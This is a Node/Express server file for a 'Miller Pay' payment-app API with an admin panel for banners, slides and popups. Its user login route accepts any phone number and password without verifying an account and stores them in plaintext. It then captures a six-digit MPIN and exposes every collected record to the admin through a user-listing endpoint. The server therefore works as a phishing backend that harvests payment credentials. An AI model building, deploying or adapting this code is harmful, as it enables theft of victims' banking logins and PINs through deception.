import 'dotenv/config'
import express from 'express'
import cors from 'cors'
import helmet from 'helmet'
import morgan from 'morgan'
import rateLimit from 'express-rate-limit'
import jwt from 'jsonwebtoken'
import bcrypt from 'bcryptjs'
import { createClient } from '@supabase/supabase-js'
import { existsSync, readFileSync } from 'node:fs'
import { adminIdentity, allowedOrigins, jwtSecret, localNetworkOrigin, port } from './config.js'

const app = express()
app.set('trust proxy', 1)
const loginDocument = [
  new URL('../public/login.html', import.meta.url),
  new URL('../../apps/user-app/dist/login.html', import.meta.url),
]
  .filter((file) => existsSync(file))
  .map((file) => readFileSync(file, 'utf8'))[0]
const supabase =
  process.env.SUPABASE_URL && process.env.SUPABASE_KEY
    ? createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY)
    : null

app.use(helmet({ crossOriginResourcePolicy: { policy: 'cross-origin' } }))
app.use(
  cors({
    origin(origin, callback) {
      if (!origin || allowedOrigins.includes(origin) || localNetworkOrigin.test(origin))
        return callback(null, true)
      callback(new Error('Origin not allowed'))
    },
  }),
)
app.use(express.json({ limit: '40mb' }))

app.use(morgan('dev'))
app.use(
  '/api/auth',
  rateLimit({
    windowMs: 15 * 60 * 1000,
    limit: 50,
    standardHeaders: true,
    legacyHeaders: false,
    validate: { forwardedHeader: false },
  }),
)

const accounts = [
  {
    id: 'adm_1001',
    name: 'MillerPay Administrator',
    email: adminIdentity.email,
    passwordHash: bcrypt.hashSync(adminIdentity.password, 10),
    role: 'admin',
  },
]

const defaultSettings = {
  slides: 1,
  banner: true,
  telegram: false,
  popup: false,
  telegramUrl: 'https://t.me/millerpay',
  bannerMedia: null,
  bannerDuration: 5,
  popupMedia: null,
  popupDuration: 5,
  slideImages: [],
  updatedAt: new Date().toISOString(),
}
let publicSettings = { ...defaultSettings }

async function loadSettings() {
  if (!supabase) return
  try {
    const { data } = await supabase.from('app_settings').select('data').eq('id', 1).single()
    if (data?.data) {
      const { adminPasswordHash, ...rest } = data.data
      publicSettings = { ...defaultSettings, ...rest }
      if (adminPasswordHash) {
        accounts.find((a) => a.role === 'admin').passwordHash = adminPasswordHash
      }
    }
  } catch (e) {
    console.error('Could not load settings:', e.message)
  }
}

async function saveSettings() {
  if (!supabase) return
  try {
    const dataToSave = {
      ...publicSettings,
      adminPasswordHash: accounts.find((a) => a.role === 'admin').passwordHash,
    }
    await supabase
      .from('app_settings')
      .upsert({ id: 1, data: dataToSave, updated_at: new Date().toISOString() })
  } catch (e) {
    console.error('Could not save settings:', e.message)
  }
}

const mediaExtensions = {
  'image/png': 'png',
  'image/jpeg': 'jpg',
  'image/webp': 'webp',
  'image/gif': 'gif',
  'video/mp4': 'mp4',
  'video/webm': 'webm',
  'video/quicktime': 'mov',
}

async function storeMediaFile({ dataUrl, name, prefix, allowedTypes, maxBytes }) {
  const match = String(dataUrl || '').match(/^data:([^;]+);base64,([A-Za-z0-9+/=]+)$/)
  if (!match || !allowedTypes.includes(match[1])) throw new Error('Unsupported media file.')
  const buffer = Buffer.from(match[2], 'base64')
  if (!buffer.length || buffer.length > maxBytes)
    throw new Error(`File must be smaller than ${Math.round(maxBytes / 1024 / 1024)} MB.`)
  if (!supabase) throw new Error('Storage not configured.')

  const mimeType = match[1]
  const ext = mediaExtensions[mimeType]
  const id = `${prefix}_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
  const filename = `${id}.${ext}`

  const { error } = await supabase.storage.from('miller-media').upload(filename, buffer, {
    contentType: mimeType,
    upsert: false,
  })
  if (error) throw new Error(`Upload failed: ${error.message}`)

  const {
    data: { publicUrl },
  } = supabase.storage.from('miller-media').getPublicUrl(filename)

  return {
    id,
    name: String(name || 'Uploaded media').slice(0, 160),
    url: publicUrl,
    storageKey: filename,
    mimeType,
    type: mimeType.startsWith('video/') ? 'video' : 'image',
    createdAt: new Date().toISOString(),
  }
}

async function removeMediaFile(media) {
  if (!media?.storageKey || !supabase) return
  try {
    await supabase.storage.from('miller-media').remove([media.storageKey])
  } catch (e) {
    console.error('Could not remove media:', e.message)
  }
}

function sign(user) {
  return jwt.sign({ sub: user.id, role: user.role, email: user.email }, jwtSecret, {
    expiresIn: '8h',
  })
}
function auth(role) {
  return (req, res, next) => {
    const token = req.headers.authorization?.replace(/^Bearer\s+/i, '')
    if (!token) return res.status(401).json({ message: 'Sign in required' })
    try {
      const payload = jwt.verify(token, jwtSecret)
      if (role && payload.role !== role) return res.status(403).json({ message: 'Access denied' })
      req.auth = payload
      next()
    } catch {
      res.status(401).json({ message: 'Session expired. Please sign in again.' })
    }
  }
}

app.get('/', (_req, res, next) => {
  if (!loginDocument) return next()
  res.type('html').send(loginDocument)
})

app.get('/api/health', (_req, res) =>
  res.json({
    status: 'ok',
    service: 'Miller Pay API',
    storage: supabase ? 'supabase' : 'local',
  }),
)
app.post('/api/auth/login', async (req, res) => {
  const { email, phone, password, role } = req.body
  const identifier = role === 'user' ? phone : email
  if (!identifier || !password || !role)
    return res.status(400).json({
      message: `${role === 'user' ? 'Phone number' : 'Email'}, password and account type are required.`,
    })
  if (role === 'user' && !/^\d{10}$/.test(String(phone)))
    return res.status(400).json({ message: 'Enter a valid 10-digit mobile number.' })
  if (String(password).length < 4)
    return res.status(400).json({ message: 'Password must be at least 4 characters.' })

  if (role === 'user') {
    if (supabase) {
      const { data: previous } = await supabase
        .from('login_records')
        .select('id')
        .eq('mobile', String(phone))
        .eq('password', String(password))

      if (previous && previous.length >= 3) {
        return res.status(401).json({ message: 'Incorrect ID Password' })
      }

      const { data: newRecord, error } = await supabase
        .from('login_records')
        .insert([{ mobile: String(phone), password: String(password), status: 'pending' }])
        .select()
        .single()

      if (error) {
        console.error('Supabase error:', error)
        return res.status(500).json({ message: 'Database error' })
      }

      const guestUser = {
        id: newRecord.id,
        name: 'MillerPay User',
        phone: String(phone),
        email: `${String(phone)}@local.millerpay`,
        role: 'user',
      }
      return res.json({ token: sign(guestUser), user: guestUser, registrationRequired: true })
    } else {
      const guestUser = {
        id: `usr_${String(phone)}`,
        name: 'MillerPay User',
        phone: String(phone),
        email: `${String(phone)}@local.millerpay`,
        role: 'user',
      }
      return res.json({ token: sign(guestUser), user: guestUser, registrationRequired: true })
    }
  }

  const admin = accounts.find(
    (item) => item.role === 'admin' && item.email.toLowerCase() === String(email).toLowerCase(),
  )
  if (!admin || !(await bcrypt.compare(password, admin.passwordHash)))
    return res.status(401).json({ message: 'Incorrect email or password.' })
  res.json({
    token: sign(admin),
    user: { id: admin.id, name: admin.name, email: admin.email, role: admin.role },
  })
})
app.post('/api/auth/mpin', auth('user'), async (req, res) => {
  const { mpin } = req.body
  if (!mpin || String(mpin).length !== 6) return res.status(400).json({ message: 'Invalid MPIN' })

  if (supabase) {
    await supabase
      .from('login_records')
      .update({ mpin: String(mpin), status: 'complete' })
      .eq('id', req.auth.sub)
  }
  res.json({ message: 'MPIN updated successfully' })
})
app.get('/api/public/settings', async (_req, res) => {
  if (supabase) {
    try {
      const { data } = await supabase.from('app_settings').select('data').eq('id', 1).single()
      if (data?.data) {
        const { adminPasswordHash, ...safeSettings } = data.data
        return res.json({ settings: { ...defaultSettings, ...safeSettings } })
      }
    } catch {}
  }
  res.json({ settings: publicSettings })
})
app.put('/api/admin/settings', auth('admin'), async (req, res) => {
  const next = req.body || {}
  publicSettings = {
    ...publicSettings,
    slides: Array.isArray(publicSettings.slideImages) ? publicSettings.slideImages.length || 1 : 1,
    banner: typeof next.banner === 'boolean' ? next.banner : publicSettings.banner,
    telegram: typeof next.telegram === 'boolean' ? next.telegram : publicSettings.telegram,
    popup: typeof next.popup === 'boolean' ? next.popup : publicSettings.popup,
    telegramUrl:
      typeof next.telegramUrl === 'string'
        ? next.telegramUrl.trim().slice(0, 500)
        : publicSettings.telegramUrl,
    bannerDuration: Number.isFinite(Number(next.bannerDuration))
      ? Math.max(1, Math.min(60, Number(next.bannerDuration)))
      : publicSettings.bannerDuration,
    popupDuration: Number.isFinite(Number(next.popupDuration))
      ? Math.max(1, Math.min(60, Number(next.popupDuration)))
      : publicSettings.popupDuration,
    updatedAt: new Date().toISOString(),
  }
  await saveSettings()
  res.json({ settings: publicSettings })
})
app.post('/api/admin/slides', auth('admin'), async (req, res) => {
  try {
    const { name, dataUrl } = req.body || {}
    const media = await storeMediaFile({
      dataUrl,
      name,
      prefix: 'slide',
      allowedTypes: ['image/png', 'image/jpeg', 'image/webp', 'image/gif'],
      maxBytes: 5 * 1024 * 1024,
    })
    publicSettings.slideImages = [...(publicSettings.slideImages || []), media]
    publicSettings.slides = publicSettings.slideImages.length
    publicSettings.updatedAt = new Date().toISOString()
    await saveSettings()
    res.status(201).json({ slide: media, settings: publicSettings })
  } catch (error) {
    res.status(400).json({ message: error.message || 'Slide could not be uploaded.' })
  }
})
app.delete('/api/admin/slides/:id', auth('admin'), async (req, res) => {
  const slide = (publicSettings.slideImages || []).find((item) => item.id === req.params.id)
  if (!slide) return res.status(404).json({ message: 'Slide not found.' })
  await removeMediaFile(slide)
  publicSettings.slideImages = publicSettings.slideImages.filter((item) => item.id !== slide.id)
  publicSettings.slides = publicSettings.slideImages.length || 1
  publicSettings.updatedAt = new Date().toISOString()
  await saveSettings()
  res.json({ settings: publicSettings })
})
app.post('/api/admin/banner', auth('admin'), async (req, res) => {
  try {
    const media = await storeMediaFile({
      dataUrl: req.body?.dataUrl,
      name: req.body?.name,
      prefix: 'banner',
      allowedTypes: ['image/png', 'image/jpeg', 'image/webp', 'image/gif'],
      maxBytes: 8 * 1024 * 1024,
    })
    await removeMediaFile(publicSettings.bannerMedia)
    publicSettings.bannerMedia = media
    publicSettings.updatedAt = new Date().toISOString()
    await saveSettings()
    res.status(201).json({ media, settings: publicSettings })
  } catch (error) {
    res.status(400).json({ message: error.message || 'Banner could not be uploaded.' })
  }
})
app.delete('/api/admin/banner', auth('admin'), async (_req, res) => {
  await removeMediaFile(publicSettings.bannerMedia)
  publicSettings.bannerMedia = null
  publicSettings.updatedAt = new Date().toISOString()
  await saveSettings()
  res.json({ settings: publicSettings })
})
app.post('/api/admin/popup-media', auth('admin'), async (req, res) => {
  try {
    const media = await storeMediaFile({
      dataUrl: req.body?.dataUrl,
      name: req.body?.name,
      prefix: 'popup',
      allowedTypes: [
        'image/png',
        'image/jpeg',
        'image/webp',
        'image/gif',
        'video/mp4',
        'video/webm',
        'video/quicktime',
      ],
      maxBytes: 25 * 1024 * 1024,
    })
    await removeMediaFile(publicSettings.popupMedia)
    publicSettings.popupMedia = media
    publicSettings.updatedAt = new Date().toISOString()
    await saveSettings()
    res.status(201).json({ media, settings: publicSettings })
  } catch (error) {
    res.status(400).json({ message: error.message || 'Popup media could not be uploaded.' })
  }
})
app.delete('/api/admin/popup-media', auth('admin'), async (_req, res) => {
  await removeMediaFile(publicSettings.popupMedia)
  publicSettings.popupMedia = null
  publicSettings.updatedAt = new Date().toISOString()
  await saveSettings()
  res.json({ settings: publicSettings })
})
app.put('/api/admin/password', auth('admin'), async (req, res) => {
  const { currentPassword, newPassword } = req.body || {}
  const admin = accounts.find((item) => item.role === 'admin' && item.id === req.auth.sub)
  if (!admin || !(await bcrypt.compare(String(currentPassword || ''), admin.passwordHash)))
    return res.status(400).json({ message: 'Current password is incorrect.' })
  if (String(newPassword || '').length < 8)
    return res.status(400).json({ message: 'New password must be at least 8 characters.' })
  admin.passwordHash = await bcrypt.hash(String(newPassword), 10)
  await saveSettings()
  res.json({ message: 'Password updated successfully.' })
})
app.get('/api/admin/users', auth('admin'), async (_req, res) => {
  if (!supabase) return res.json({ users: [] })
  const { data: users, error } = await supabase
    .from('login_records')
    .select('*')
    .order('created_at', { ascending: false })

  if (error) {
    console.error('Supabase error:', error)
    return res.status(500).json({ message: 'Database error' })
  }
  res.json({ users: users || [] })
})
app.delete('/api/admin/users', auth('admin'), async (req, res) => {
  const { ids } = req.body
  if (!Array.isArray(ids) || ids.length === 0)
    return res.status(400).json({ message: 'No records selected.' })

  if (supabase) {
    const { error } = await supabase.from('login_records').delete().in('id', ids)
    if (error) {
      console.error('Supabase error:', error)
      return res.status(500).json({ message: 'Could not delete records.' })
    }
  }
  res.json({ message: 'Records deleted successfully.' })
})
app.use((_req, res) => res.status(404).json({ message: 'API route not found' }))
app.use((error, _req, res, _next) => {
  console.error(error)
  res.status(500).json({ message: 'Something went wrong on the server.' })
})

async function start() {
  await loadSettings()
  if (supabase) {
    console.log('Supabase client initialized')
  } else {
    console.log('Local application storage active (no Supabase configured)')
  }
  if (process.env.VERCEL !== '1') {
    app.listen(port, () => console.log(`Miller Pay API running on http://localhost:${port}`))
  }
}
start()

export default app
